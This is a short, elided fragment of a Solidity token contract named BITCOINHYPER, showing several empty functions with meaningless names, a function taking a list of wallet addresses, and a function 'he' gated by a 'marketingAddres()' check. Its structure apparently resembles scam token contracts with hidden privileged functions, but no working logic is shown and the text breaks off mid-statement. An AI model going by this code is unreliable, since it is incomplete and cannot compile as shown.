...
contract BITCOINHYPER is Ownable {
    ...
    function expenditure() public {
    }
    function norm() external {
    }
    function bus() public {
    }
    function mosaic() public {
    }
    function deserve(address[] calldata walletAddress) external {
    ...
    function he(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
